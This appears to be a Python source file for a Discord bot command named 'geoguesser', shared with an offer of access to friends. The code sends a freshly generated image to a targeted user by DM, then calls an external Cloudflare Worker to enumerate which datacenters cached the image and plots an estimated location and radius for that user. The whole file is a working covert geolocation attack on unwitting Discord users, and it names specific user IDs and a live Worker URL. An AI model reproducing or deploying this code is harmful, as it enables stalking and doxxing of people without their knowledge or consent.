"""
z command nga for zaneok and ppl who use zbot dm me if uw ant accses or just larp my code

geoguesser.py – !geoguesser <@user>
Generates a unique random image, sends it to a target user,
then uses Cloudflare cache enumeration to locate the target.
Displays results with a map and estimated radius.
Allowed users: OWNER_ID + ALLOWED_USERS list.
"""

import asyncio
import aiohttp
import io
import random
import discord
from PIL import Image, ImageDraw
from datetime import datetime
import math

# ============ CONFIGURATION ============
OWNER_ID = 981259484691325018
ALLOWED_USERS = [
    981259484691325018,   # your ID
    1111670025519112192,  # friend's ID
]
WORKER_URL = "https://shiny-lab-d8d2.zkutchinsky4413.workers.dev"
# =======================================

# Approximate coordinates for Cloudflare colos
COLO_COORDS = {
    'EWR': {'lat': 40.6895, 'lon': -74.1745, 'name': 'Newark, NJ'},
    'IAD': {'lat': 38.9531, 'lon': -77.4475, 'name': 'Washington DC'},
    'ATL': {'lat': 33.6407, 'lon': -84.4277, 'name': 'Atlanta, GA'},
    'ORD': {'lat': 41.9742, 'lon': -87.9073, 'name': 'Chicago, IL'},
    'DFW': {'lat': 32.8998, 'lon': -97.0403, 'name': 'Dallas, TX'},
    'LAX': {'lat': 33.9416, 'lon': -118.4085, 'name': 'Los Angeles, CA'},
    'SEA': {'lat': 47.4502, 'lon': -122.3088, 'name': 'Seattle, WA'},
    'MIA': {'lat': 25.7959, 'lon': -80.2870, 'name': 'Miami, FL'},
    'DEN': {'lat': 39.8561, 'lon': -104.6737, 'name': 'Denver, CO'},
    'PHX': {'lat': 33.4484, 'lon': -112.0740, 'name': 'Phoenix, AZ'},
    'SJC': {'lat': 37.3382, 'lon': -121.8863, 'name': 'San Jose, CA'},
    'PDX': {'lat': 45.5898, 'lon': -122.5951, 'name': 'Portland, OR'},
    'SLC': {'lat': 40.7608, 'lon': -111.8910, 'name': 'Salt Lake City, UT'},
    'MSP': {'lat': 44.9778, 'lon': -93.2650, 'name': 'Minneapolis, MN'},
    'STL': {'lat': 38.6270, 'lon': -90.1994, 'name': 'St. Louis, MO'},
    'BOS': {'lat': 42.3601, 'lon': -71.0589, 'name': 'Boston, MA'},
    'PHL': {'lat': 39.9526, 'lon': -75.1652, 'name': 'Philadelphia, PA'},
    'CLT': {'lat': 35.2271, 'lon': -80.8431, 'name': 'Charlotte, NC'},
    'TPA': {'lat': 27.9506, 'lon': -82.4572, 'name': 'Tampa, FL'},
    'HOU': {'lat': 29.7604, 'lon': -95.3698, 'name': 'Houston, TX'},
}

def generate_random_image():
    w, h = 64, 64
    img = Image.new('RGB', (w, h))
    pixels = img.load()
    for x in range(w):
        for y in range(h):
            pixels[x, y] = (random.randint(0, 255),
                           random.randint(0, 255),
                           random.randint(0, 255))
    draw = ImageDraw.Draw(img)
    for _ in range(8):
        x1, y1 = random.randint(0, w), random.randint(0, h)
        x2, y2 = random.randint(0, w), random.randint(0, h)
        draw.line([(x1, y1), (x2, y2)], fill=(random.randint(0, 255),
                                              random.randint(0, 255),
                                              random.randint(0, 255)), width=2)
    img_bytes = io.BytesIO()
    img.save(img_bytes, format='PNG')
    img_bytes.seek(0)
    return img_bytes

def haversine(lat1, lon1, lat2, lon2):
    R = 3959
    lat1, lon1, lat2, lon2 = map(math.radians, [lat1, lon1, lat2, lon2])
    dlat = lat2 - lat1
    dlon = lon2 - lon1
    a = math.sin(dlat/2)**2 + math.cos(lat1) * math.cos(lat2) * math.sin(dlon/2)**2
    return R * 2 * math.asin(math.sqrt(a))

async def run(client, message, args):
    if message.author.id not in ALLOWED_USERS:
        await message.channel.send("Unauthorized.", delete_after=5)
        return

    if not args.strip():
        await message.channel.send("Usage: `!geoguesser <@user or user_id>`")
        return

    target_arg = args.strip().split()[0]

    try:
        if target_arg.startswith('<@') and target_arg.endswith('>'):
            user_id = int(target_arg.strip('<@!>'))
        else:
            user_id = int(target_arg)
        target = await client.fetch_user(user_id)
    except (ValueError, discord.NotFound):
        await message.channel.send("❌ Invalid user ID or mention.")
        return

    status_msg = await message.channel.send("🖼️ Generating unique image...")
    img_bytes = generate_random_image()

    await status_msg.edit(content="📤 Uploading to Discord CDN...")
    sent = await message.channel.send(file=discord.File(img_bytes, filename="geo.png"))
    if not sent.attachments:
        await status_msg.edit(content="❌ Failed to upload image.")
        return
    image_url = sent.attachments[0].url
    await sent.delete()

    await status_msg.edit(content=f"✅ Image URL: {image_url[:60]}...")

    await status_msg.edit(content=f"📨 Sending image to {target.name}...")
    try:
        img_bytes.seek(0)
        await target.send(file=discord.File(img_bytes, filename="geo.png"))
        await status_msg.edit(content=f"✅ Image sent to {target.name}.")
    except discord.Forbidden:
        await status_msg.edit(content="❌ Cannot DM that user (DMs closed).")
        return
    except Exception as e:
        await status_msg.edit(content=f"❌ Failed to send: {e}")
        return

    await status_msg.edit(content="⏳ Waiting 12 seconds for cache & notifications...")
    await asyncio.sleep(12)

    await status_msg.edit(content="🔍 Enumerating Cloudflare cache locations...")
    api_url = f"{WORKER_URL}?url={image_url}"

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=35) as resp:
                if resp.status != 200:
                    await status_msg.edit(content=f"❌ Worker error (HTTP {resp.status})")
                    return
                data = await resp.json()
    except Exception as e:
        await status_msg.edit(content=f"❌ Worker call failed: {e}")
        return

    datacenters = data.get('datacenters', [])
    hits = data.get('hits', 0)
    checked = data.get('checked', 0)

    if not datacenters:
        await status_msg.edit(content="❌ No cache hits. Target may not have downloaded the image.")
        return

    coords = []
    colo_names = []
    for colo in datacenters:
        if colo in COLO_COORDS:
            coords.append(COLO_COORDS[colo])
            colo_names.append(f"{colo} ({COLO_COORDS[colo]['name']})")
        else:
            colo_names.append(colo)

    if coords:
        center_lat = sum(c['lat'] for c in coords) / len(coords)
        center_lon = sum(c['lon'] for c in coords) / len(coords)
        max_dist = max(haversine(center_lat, center_lon, c['lat'], c['lon']) for c in coords)
        radius_miles = max_dist * 1.5 if max_dist > 0 else 250

        markers = '|'.join([f"{c['lat']},{c['lon']},red-pushpin" for c in coords])
        map_url = f"https://staticmap.openstreetmap.de/staticmap.php?center={center_lat},{center_lon}&zoom=5&size=600x400&markers={markers}&maptype=mapnik"

        embed = discord.Embed(
            title="📍 GeoGuesser – Location Estimate",
            description=f"**Target:** {target.name}\n"
                        f"**Image URL:** [Link]({image_url})\n"
                        f"**Datacenters found:** {len(datacenters)}\n"
                        f"**Estimated radius:** ~{radius_miles:.0f} miles",
            color=0x00ff00,
            timestamp=datetime.now()
        )
        embed.add_field(name="🌐 Datacenters", value="\n".join(colo_names[:12]) + ("" if len(colo_names)<=12 else f"\n... and {len(colo_names)-12} more"), inline=False)
        embed.add_field(name="📊 Scan Stats", value=f"Checked: {checked}\nHits: {hits}", inline=True)
        embed.add_field(name="📍 Center", value=f"{center_lat:.4f}, {center_lon:.4f}", inline=True)
        embed.set_footer(text="Powered by Cloudflare Cache Enumeration")
        embed.set_image(url=map_url)

        await status_msg.delete()
        await message.channel.send(embed=embed)
    else:
        await status_msg.edit(content=f"Found datacenters: {', '.join(datacenters)} – but no coordinates available.")